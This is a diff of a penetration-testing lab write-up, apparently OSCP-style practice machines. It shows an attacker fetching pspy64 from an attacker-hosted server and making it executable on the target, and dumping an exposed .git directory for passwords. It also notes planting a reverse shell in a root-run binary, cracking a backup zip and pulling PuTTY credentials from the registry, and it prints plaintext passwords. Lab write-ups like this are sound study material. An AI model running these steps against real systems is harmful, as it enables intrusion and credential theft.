 ![Pasted image 20260109152811.png](/ob/Pasted%20image%2020260109152811.png)
 
-```
-
-┌──(haydon_env)─(root㉿kali)-[~/tools]
-└─# sudo python3 -m http.server 21  
-Serving HTTP on 0.0.0.0 port 21 (http://0.0.0.0:21/) ...
-192.168.228.143 - - [09/Jan/2026 15:32:17] "GET /pspy64 HTTP/1.1" 200 -
-
------------------------------------------------------------------------------
-
-$ cd /tmp
-$ curl -L http://192.168.45.193:21/pspy64 -o pspy64
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100 3032k  100 3032k    0     0  7150k      0 --:--:-- --:--:-- --:--:-- 7134k
-$ 
-```
-
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Linux-Privilege-Escalation-link-Injection" >}} pspy64 reveal that /usr/bin/asinfo (own by root )will auto run , and the /opt/aerospike/bin/asinfo (own by aero ) is linked to /usr/bin/asinfo, so when i inject the revshell to the /opt/aerospike/bin/asinfo , i will be root\
-{{< /toggle >}}
+{{< tag "Linux-Privilege-Escalation-link-Injection" >}} Discovering /usr/bin/asinfo pspy64 (own by root ) which is linked to /opt/aerospike/bin/asinfo(own by us) by pspy64, then inject revshell to have the root .
+
+{{< /toggle >}}\
+{{< mindmap >}}
+
+# pspy64
+
+* /usr/bin/asinfo
+  * opt/aerospike/bin/asinfo
+    * inject into opt/aerospike/bin/asinfo
+      * root\
+        {{< /mindmap >}}
 
 ```
 $ chmod +x pspy64
@@ -1578,15 +924,9 @@ aero@oscp:/tmp$ whoami
 aero
 ```
 
-![Pasted image 20260207144417.png](/ob/Pasted%20image%2020260207144417.png)
+# Recon 192.168.X.144
 
-![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
-
-# 192.168.X.144
-
-192.168.136.144
-
-### \[\[PORT & IP SCAN]]
+### Nmap
 
 ```
 Not shown: 65517 closed tcp ports (reset)
@@ -1656,60 +996,25 @@ Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
                                                                                                     
 ```
 
-### \[\[SSH 22]] -- Scans
-
-```
-└─#  ssh stuart@192.168.136.144 
-The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
-ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
-stuart@192.168.136.144's password: 
-Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Wed Jan 14 03:32:39 PM UTC 2026
-
-  System load:  0.0                Processes:               203
-  Usage of /:   40.4% of 18.53GB   Users logged in:         0
-  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
-  Swap usage:   0%
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-0 updates can be applied immediately.
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
-stuart@oscp:~$ 
-
-```
-
 ***
-
-# Web Recon 80
-
-![Pasted image 20260114221737.png](/ob/Pasted%20image%2020260114221737.png)
-
-![Pasted image 20260114221855.png](/ob/Pasted%20image%2020260114221855.png)
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "web-github-abuse" >}} Found the password via .git/ backup file in the database.php
+{{< tag "web-github-abuse" >}} Discovering the /.git/ in website by nmap ,then, abusing git to find database.php which contain password to login by ssh
 
 {{< /toggle >}}
 
-### \[\[git recon]]
+{{< mindmap >}}
+
+# nmap
+
+* git
+  * database.php
+    * password
+      * ssh\
+        {{< /mindmap >}}
+
+### git recon
 
 ```
 ─# uv pip install git-dumper 
@@ -1728,88 +1033,14 @@ Installed 12 packages in 52ms
  + requests==2.32.5
  + requests-pkcs12==1.27
  + soupsieve==2.8.1
- + urllib3==2.6.3
+ + urllib3==2.6.3                                        
+```
 
-
-------------------------------------------------------------
-
+```
 └─# uv run git-dumper http://192.168.136.144/.git/ .       
 [-] Testing http://192.168.136.144/.git/HEAD [200]
 [-] Testing http://192.168.136.144/.git/ [200]
-[-] Fetching .git recursively
-[-] Fetching http://192.168.136.144/.gitignore [404]
-[-] http://192.168.136.144/.gitignore responded with status code 404
-[-] Fetching http://192.168.136.144/.git/ [200]
-[-] Fetching http://192.168.136.144/.git/index [200]
-[-] Fetching http://192.168.136.144/.git/api/ [200]
-[-] Fetching http://192.168.136.144/.git/HEAD [200]
-Task .git/api/ raised exception:
-[-] Fetching http://192.168.136.144/.git/hooks/ [200]
-Traceback (most recent call last):
-[-] Fetching http://192.168.136.144/.git/README.md [200]
-[-] Fetching http://192.168.136.144/.git/branches/ [200]
-  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 155, in run
-    result = self.do_task(task, *self.args)
-  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 302, in do_task
-    assert is_html(response)
-           ~~~~~~~^^^^^^^^^^
-AssertionError
-[-] Fetching http://192.168.136.144/.git/COMMIT_EDITMSG [200]
-[-] Fetching http://192.168.136.144/.git/info/ [200]
-[-] Fetching http://192.168.136.144/.git/description [200]
-[-] Fetching http://192.168.136.144/.git/configuration/ [200]
-[-] Fetching http://192.168.136.144/.git/config [200]
-[-] Fetching http://192.168.136.144/.git/logs/ [200]
-[-] Fetching http://192.168.136.144/.git/packed-refs [200]
-[-] Fetching http://192.168.136.144/.git/objects/ [200]
-[-] Fetching http://192.168.136.144/.git/info/exclude [200]
-[-] Fetching http://192.168.136.144/.git/refs/ [200]
-[-] Fetching http://192.168.136.144/.git/robots.txt [200]
-[-] Fetching http://192.168.136.144/.git/hooks/applypatch-msg.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/commit-msg.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/fsmonitor-watchman.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/post-update.sample [200]
-[-] Fetching http://192.168.136.144/.git/orders/ [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-applypatch.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-commit.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-merge-commit.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-push.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-receive.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/pre-rebase.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/prepare-commit-msg.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/push-to-checkout.sample [200]
-[-] Fetching http://192.168.136.144/.git/hooks/update.sample [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/ [200]
-[-] Fetching http://192.168.136.144/.git/refs/remotes/ [200]
-[-] Fetching http://192.168.136.144/.git/refs/heads/ [200]
-[-] Fetching http://192.168.136.144/.git/configuration/database.php [200]
-[-] Fetching http://192.168.136.144/.git/refs/tags/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/44/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/8a/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/80/ [200]
-[-] Fetching http://192.168.136.144/.git/logs/HEAD [200]
-[-] Fetching http://192.168.136.144/.git/objects/93/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/info/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/8a/d08b041c8e2dfe72cc2ba90bcaed4d1088873f [200]
-[-] Fetching http://192.168.136.144/.git/objects/44/a055daf7a0cd777f28f444c0d29ddf3ff08c54 [200]
-[-] Fetching http://192.168.136.144/.git/orders/search.php [200]
-[-] Fetching http://192.168.136.144/.git/refs/heads/main [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/ [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/heads/ [200]
-[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/pack/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/80/9af487f5bb4b71659f897b793347ce62a3b5f4 [200]
-[-] Fetching http://192.168.136.144/.git/objects/93/290282d106a338e8d8a60e4297173c677aa73d [200]
-[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/HEAD [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/heads/main [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/ [200]
-[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.idx [200]
-[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.pack [200]
-[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/HEAD [200]
-[-] Sanitizing .git/config
-[-] Running git checkout .
-Updated 7 paths from the index
-                                                         
+...snip...
 ```
 
 ### git abuse
@@ -1856,7 +1087,7 @@ Date:   Fri Nov 18 17:26:09 2022 +0200
 
 ![Pasted image 20260114232631.png](/ob/Pasted%20image%2020260114232631.png)
 
-> got the account stuart@challenge.lab : BreakingBad92
+got the account stuart@challenge.lab : BreakingBad92
 
 ```shell
 ─#     git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
@@ -1894,7 +1125,7 @@ index 0000000..55b1645
 
 ```
 
-### \[\[SSH 22]] -- Scans
+### SSH 22
 
 ```
 └─#  ssh stuart@192.168.136.144 
@@ -1937,7 +1168,8 @@ stuart@oscp:~$
 
 {{< toggle "Tag 🏷️" >}}
 
-{{< tag "Linux-Privilege-Escalation-backupfile" >}} Found the backup file in the /opt ,hashcat find the password, in the /joomla/configuration.php find the another password\
+{{< tag "Linux-Privilege-Escalation-backupfile" >}} Discovering zip backup file zip ,using zip2john to get the backup file password, configuration.php of joomla contain the chloe's password
+
 {{< /toggle >}}
 
 ![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)
@@ -2022,6 +1254,8 @@ Session completed.
 
 ```
 
+use the 7z with the password to decode the zip file
+
 ```
 sudo apt install p7zip-full
 Ign:1 http://security.kali.org/kali-security kali/updates InRelease
@@ -2097,122 +1331,3 @@ chloe@oscp:/opt/backup$ su root
 ![Pasted image 20260115004217.png](/ob/Pasted%20image%2020260115004217.png)
 
 ![Pasted image 20260115004340.png](/ob/Pasted%20image%2020260115004340.png)
-
-***
-
-# Recon 192.168.x.143
-
-### \[\[PORT & IP SCAN]]
-
-```
-└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.145 -oN serviceScan.txt
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 00:48 +0800
-Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
-Service scan Timing: About 85.71% done; ETC: 00:51 (0:00:25 remaining)
-Nmap scan report for 192.168.136.145
-Host is up (0.049s latency).
-
-PORT     STATE SERVICE       VERSION
-21/tcp   open  ftp           Microsoft ftpd
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_Can't get directory listing: TIMEOUT
-| ftp-syst: 
-|_  SYST: Windows_NT
-80/tcp   open  http          Microsoft IIS httpd 10.0
-|_http-title: Samuel's Personal Site
-|_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp  open  microsoft-ds?
-1978/tcp open  unisql?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
-|_    system windows 6.2
-3389/tcp open  ms-wbt-server Microsoft Terminal Services
-| ssl-cert: Subject: commonName=oscp
-| Not valid before: 2025-09-18T02:02:28
-|_Not valid after:  2026-03-20T02:02:28
-| rdp-ntlm-info: 
-|   Target_Name: OSCP
-|   NetBIOS_Domain_Name: OSCP
-|   NetBIOS_Computer_Name: OSCP
-|   DNS_Domain_Name: oscp
-|   DNS_Computer_Name: oscp
-|   Product_Version: 10.0.19041
-|_  System_Time: 2026-01-14T16:51:20+00:00
-|_ssl-date: 2026-01-14T16:52:00+00:00; 0s from scanner time.
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port1978-TCP:V=7.98%I=7%D=1/15%Time=6967C8F0%P=x86_64-pc-linux-gnu%r(NU
-SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
-SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
-SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
-SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
-SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
-SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
-SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
-SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
-SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
-SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
-SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
-SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
-SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
-SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
-SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
-SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
-SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
-SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
-SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
-SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
-SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2026-01-14T16:51:22
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 200.06 seconds
-
-```
-
-### \[\[Unkown Port]] -- Scans  1978
-
-> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
-
-```
-```
-
-![Pasted image 20260115005747.png](/ob/Pasted%20image%2020260115005747.png)
-
-![Pasted image 20260115010216.png](/ob/Pasted%20image%2020260115010216.png)
-
-![Pasted image 20260115012444.png](/ob/Pasted%20image%2020260115012444.png)
-
-### offsec to admin (Registry Cred leak)
-
-https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "Windows-Privilege-Escalation-Putty" >}} Enumeration for PuTTY Credentials in Registry to find the admin password
-
-{{< /toggle >}}
-
-![Pasted image 20260115012619.png](/ob/Pasted%20image%2020260115012619.png)
-
-```
-reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
-```
-
-![Pasted image 20260115012704.png](/ob/Pasted%20image%2020260115012704.png)\
-zachary:h3R@tC@tch3r
-
-![Pasted image 20260115013001.png](/ob/Pasted%20image%2020260115013001.png)
-
-***
